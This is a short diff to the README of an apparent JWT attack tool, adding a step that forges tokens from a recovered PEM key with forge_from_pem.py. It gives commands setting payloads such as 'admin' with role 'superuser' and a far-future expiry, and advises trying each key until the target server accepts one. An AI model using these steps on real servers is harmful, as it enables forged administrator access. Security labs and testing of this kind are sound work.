@@ -61,3 +61,21 @@ Cleanup: To remove all created files
 ~~~bash
 rm -rf *.pem .venv/
 ~~~
+
+----
+
+# Step 2 (optional): Forge a JWT from a recovered PEM
+
+Once you have a `.pem` file, use `forge_from_pem.py` to generate a token with a custom payload — without re-running the key recovery:
+
+~~~bash
+# Default payload: {"sub": "administrator", "exp": <+24h>}
+uv run forge_from_pem.py key.pem
+
+# Custom payload and header
+uv run forge_from_pem.py key.pem \
+  --payload '{"sub": "admin", "role": "superuser", "exp": 9999999999}' \
+  --header '{"kid": "your-key-id"}'
+~~~
+
+Try each recovered `.pem` (x509 and pkcs1 variants) until one is accepted by the target server.
